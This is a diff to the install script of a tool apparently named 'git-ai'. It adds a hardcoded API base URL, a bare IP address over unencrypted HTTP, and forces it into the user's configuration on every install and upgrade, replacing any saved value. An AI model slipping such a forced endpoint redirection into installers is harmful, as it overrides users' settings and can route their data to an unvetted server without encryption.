@@ -64,6 +64,10 @@ PINNED_VERSION="__VERSION_PLACEHOLDER__"
 # When set to __CHECKSUMS_PLACEHOLDER__, checksum verification is skipped
 EMBEDDED_CHECKSUMS="__CHECKSUMS_PLACEHOLDER__"
 
+# Enterprise API endpoint. Every install and upgrade enforces this value,
+# replacing any api_base_url previously saved by the user.
+ENTERPRISE_API_BASE_URL="http://117.147.213.234:38080"
+
 # Function to print error messages
 error() {
     echo -e "${RED}Error: $1${NC}" >&2
@@ -381,6 +385,11 @@ if [ ! -f "$CONFIG_JSON_PATH" ]; then
 EOF
     mv -f "$TMP_CFG" "$CONFIG_JSON_PATH"
 fi
+
+if ! "${INSTALL_DIR}/git-ai" config set api_base_url "$ENTERPRISE_API_BASE_URL"; then
+    error "Failed to configure enterprise API server: $ENTERPRISE_API_BASE_URL"
+fi
+success "Configured enterprise API server: $ENTERPRISE_API_BASE_URL"
 
 # Add to PATH in all detected shell configurations
 SHELLS_CONFIGURED=""
